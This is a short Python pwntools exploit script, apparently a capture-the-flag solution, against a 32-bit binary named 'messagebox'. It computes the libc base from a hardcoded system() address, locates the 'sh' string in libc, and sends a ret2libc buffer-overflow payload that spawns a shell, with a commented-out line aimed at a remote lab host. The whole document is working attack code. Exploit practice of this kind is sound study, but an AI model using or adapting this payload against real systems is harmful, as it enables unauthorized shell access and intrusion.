from pwn import *
import sys

#r = remote("10.2.32.84", 2003)
r = process("./messagebox_f7d6fc6d824042f4753346d8af1c5e5f")

e = ELF('/lib/i386-linux-gnu/libc.so.6')
systemOffset = e.symbols['system']
systemAddr = 0xf7e2eb30

libcBase = systemAddr - systemOffset

lsOffset = e.search('ls\x00').next()
shOffset = e.search('sh\x00').next()

lsAddr = libcBase + lsOffset
shAddr = libcBase + shOffset

payload = 'A'*32 + 'BBBB' + 'A'*(52-32-4) \
	+p32(systemAddr)\
	+b'AAAA' \
	+p32(shAddr) \
	+ '\n48.5647049\n'
r.sendline(payload)
r.interactive()
